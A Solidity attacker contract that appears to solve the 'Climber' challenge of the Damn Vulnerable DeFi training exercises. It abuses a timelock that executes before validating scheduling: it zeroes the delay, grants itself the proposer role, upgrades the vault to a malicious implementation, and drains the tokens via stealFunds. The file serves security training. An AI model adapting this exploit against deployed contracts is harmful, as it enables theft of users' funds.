import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "../../src/climber/ClimberVault.sol";
import "../../src/climber/ClimberTimelock.sol";
import "../../src/DamnValuableToken.sol";
import "./MaliciousVault.sol";

contract ClimberAttacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address recovery;
    address maliciousImpl;
    
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = bytes32(0);

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        DamnValuableToken _token,
        address _recovery,
        address _maliciousImpl
    ) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
        maliciousImpl = _maliciousImpl;
    }

    function attack() external {
        // 构建与 execute 完全相同的参数
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, uint64(0));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            maliciousImpl,
             abi.encodeWithSelector(MaliciousVault.initializeV2.selector, recovery)  // 升级后立即初始化
        );

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(this.scheduleOperation.selector);

        timelock.execute(targets, values, dataElements, salt);
       MaliciousVault(address(vault)).stealFunds(address(token));
        // token.transfer(recovery, token.balanceOf(address(this)));
    }

    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}